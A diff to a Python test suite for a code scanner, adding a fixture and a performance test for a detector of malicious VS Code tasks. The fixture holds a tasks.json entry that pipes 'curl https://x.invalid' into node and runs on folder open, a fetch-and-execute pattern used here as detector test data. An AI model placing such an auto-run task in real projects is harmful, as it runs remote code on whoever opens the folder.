@@ -413,6 +413,11 @@ _UNREPORTED: dict[str, tuple[Callable[[Path], object], dict[str, str], str, list
             {"name": "loud", "preLaunchTask": "loud-task"},
             *({"name": f"q{i}", "preLaunchTask": _quiet(i)} for i in _QUIET)]})},
         "loud-task", [_quiet(i) for i in _QUIET]),
+    "tasks": (ide_task_rce.scan, {".vscode/tasks.json": _js({"version": "2.0.0", "tasks": [
+        {"label": "loud-task", "type": "shell", "command": "curl https://x.invalid | node",
+         "runOptions": {"runOn": "folderOpen"}},
+        *({"label": _quiet(i), "type": "process", "command": "true"} for i in _QUIET)]})},
+        "loud-task", [_quiet(i) for i in _QUIET]),
     "aadhaar": (india_pii.scan, {"notes.md": f"aadhaar {_AADHAAR_LOUD[:4]} {_AADHAAR_LOUD[4:8]} {_AADHAAR_LOUD[8:]}\n"
                                  + "".join(f"id {n}\n" for n in _quiet_aadhaars())},
                 f"{_AADHAAR_LOUD[:4]} {_AADHAAR_LOUD[4:8]} {_AADHAAR_LOUD[8:]}", _quiet_aadhaars()),
@@ -429,6 +434,17 @@ def test_an_item_no_finding_reports_is_never_looked_up(tmp_path: Path, shape: st
     searched = {key for entry in _helpers._TEXT_LOOKUPS.values() for key in entry.found}
     assert reported in searched, shape
     assert not searched & set(quiet), sorted(searched & set(quiet))[:3]
+
+
+def test_quiet_tasks_with_long_labels_cost_no_more_than_reading_them(tmp_path: Path) -> None:
+    """ide_task_rce reads tasks.json with no size cap, and a task's line was looked up
+    by its label before the task was judged. Before Python 3.10 that compiled each
+    label into a pattern first: eight quiet tasks labelled with 1 MiB each took 9.25 s
+    on 3.9. A quiet task's label is not looked up at all now."""
+    tasks = [{"label": f"t{i}-" + "a" * ((1 << 20) - 3), "type": "process", "command": "true"} for i in range(8)]
+    _write(tmp_path, {".vscode/tasks.json": json.dumps({"version": "2.0.0", "tasks": tasks}, indent=1)})
+    assert ide_task_rce.scan(tmp_path)[0] == []
+    assert _seconds(lambda: ide_task_rce.scan(tmp_path)) < 5.0
 
 
 # ---------------------------------------------------------------------------
